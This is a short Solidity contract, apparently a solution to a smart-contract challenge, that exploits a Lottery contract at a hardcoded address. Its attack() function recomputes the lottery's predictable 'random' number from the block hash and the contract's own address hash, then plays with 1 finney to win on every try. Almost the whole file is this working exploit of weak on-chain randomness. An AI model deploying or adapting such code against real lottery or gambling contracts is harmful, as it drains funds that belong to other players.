pragma solidity  0.4.24;
 
import "./Lottery.sol";
 
contract test{
    Lottery t;
    function test() public payable {
        t =Lottery(0x57a9aab42e84b843e9d9bff383cef4c3f65f3d23);
    }
    function attack()public payable{
        bytes32 entropy = block.blockhash(block.number);
        bytes32 entropy2 = keccak256(this);
        uint256 target = uint256(entropy^entropy2);
        t.play.value(1 finney)(target);
    }
    function()  public payable{}
}